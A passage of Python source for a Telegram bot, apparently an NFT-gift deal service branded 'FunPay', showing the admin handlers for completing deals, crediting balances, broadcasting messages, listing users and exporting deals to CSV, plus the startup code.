            await bot.send_message(deal[1], f"✅ NFT-подарок по сделке {deal_id} передан на ваш кошелек!\n\nСпасибо за использование FunPay!")
            if deal[3]:
                await bot.send_message(deal[3], f"✅ Средства по сделке {deal_id} зачислены на ваш баланс!\nСумма: {deal[5]} {deal[6]}")
            await message.answer(f"✅ Сделка {deal_id} завершена! Продавцу начислено {deal[5]} {deal[6]}.", reply_markup=admin_menu())
        else:
            await message.answer("⚠️ Ошибка начисления баланса.", reply_markup=admin_menu())
        await state.finish()
    except Exception as e:
        await message.answer(f"⚠️ Ошибка: {str(e)[:100]}", reply_markup=admin_menu())
        await state.finish()

@dp.callback_query_handler(lambda c: c.data == "admin_topup")
async def admin_topup(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещен.")
        return
    await callback.message.edit_text(
        "💳 <b>Пополнение баланса</b>\n\n"
        "Введите данные для пополнения баланса:\n"
        "Формат: user_id сумма валюта\n"
        "Пример: 123456789 100 Stars",
        parse_mode="HTML"
    )
    await AdminStates.waiting_topup_user_id.set()
    await callback.answer()

@dp.message_handler(state=AdminStates.waiting_topup_user_id)
async def admin_topup_process(message: types.Message, state: FSMContext):
    try:
        parts = message.text.strip().split()
        if len(parts) != 3:
            await message.answer("❌ Неверный формат.\nИспользование: user_id сумма валюта", reply_markup=admin_menu())
            return
        user_id = int(parts[0])
        amount = float(parts[1])
        currency = parts[2]
        if update_balance(user_id, currency, amount):
            await message.answer(f"✅ Баланс пользователя {user_id} пополнен на {amount} {currency}.", reply_markup=admin_menu())
        else:
            await message.answer("⚠️ Ошибка пополнения.", reply_markup=admin_menu())
        await state.finish()
    except Exception as e:
        await message.answer(f"⚠️ Ошибка: {str(e)[:100]}", reply_markup=admin_menu())
        await state.finish()

@dp.callback_query_handler(lambda c: c.data == "admin_broadcast")
async def admin_broadcast(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещен.")
        return
    await callback.message.edit_text(
        "📩 <b>Рассылка</b>\n\n"
        "Введите текст рассылки для всех пользователей:",
        parse_mode="HTML"
    )
    await AdminStates.waiting_broadcast_text.set()
    await callback.answer()

@dp.message_handler(state=AdminStates.waiting_broadcast_text)
async def admin_broadcast_process(message: types.Message, state: FSMContext):
    try:
        text = message.text.strip()
        if not text:
            await message.answer("❌ Текст не может быть пустым.")
            return
        users = get_all_user_ids()
        sent = 0
        for uid in users:
            try:
                await bot.send_message(uid, f"📢 ОБЪЯВЛЕНИЕ\n\n{text}")
                sent += 1
            except:
                pass
        await message.answer(f"✅ Рассылка отправлена {sent} пользователям.", reply_markup=admin_menu())
        await state.finish()
    except Exception as e:
        await message.answer(f"⚠️ Ошибка: {str(e)[:100]}", reply_markup=admin_menu())
        await state.finish()

@dp.callback_query_handler(lambda c: c.data == "admin_users")
async def admin_users(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещен.")
        return
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT user_id, username, created_at FROM users ORDER BY created_at DESC LIMIT 20")
    users = cur.fetchall()
    conn.close()
    if not users:
        await callback.message.edit_text("📭 Нет зарегистрированных пользователей.", reply_markup=admin_menu())
        await callback.answer()
        return
    text = "👥 <b>Последние 20 пользователей</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for u in users:
        username = f"@{u[1]}" if u[1] else "без username"
        text += f"🆔 {u[0]} | {username}\n   📅 {u[2][:16]}\n\n"
    await callback.message.edit_text(text[:4000], parse_mode="HTML", reply_markup=admin_menu())
    await callback.answer()

@dp.callback_query_handler(lambda c: c.data == "admin_export")
async def admin_export(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещен.")
        return
    await callback.message.edit_text("⏳ Экспорт данных...", reply_markup=admin_menu())
    await callback.answer()
    
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM deals")
    deals = cur.fetchall()
    conn.close()
    if not deals:
        await callback.message.edit_text("📭 Нет данных для экспорта.", reply_markup=admin_menu())
        return
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['ID', 'Создатель', 'Роль', 'Участник', 'Роль', 'Сумма', 'Валюта', 'Описание', 'Статус', 'Создана', 'Завершена'])
    writer.writerows(deals)
    await callback.message.answer_document(
        types.InputFile(io.BytesIO(output.getvalue().encode('utf-8')), filename='deals_export.csv'),
        caption='📊 Экспорт всех сделок',
        reply_markup=admin_menu()
    )

# ============ ЗАПУСК ============
print("=== БОТ ГОТОВ К ЗАПУСКУ ===")

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(start_web())
    print("🚀 БОТ ЗАПУЩЕН!")
    executor.start_polling(dp, skip_updates=True)
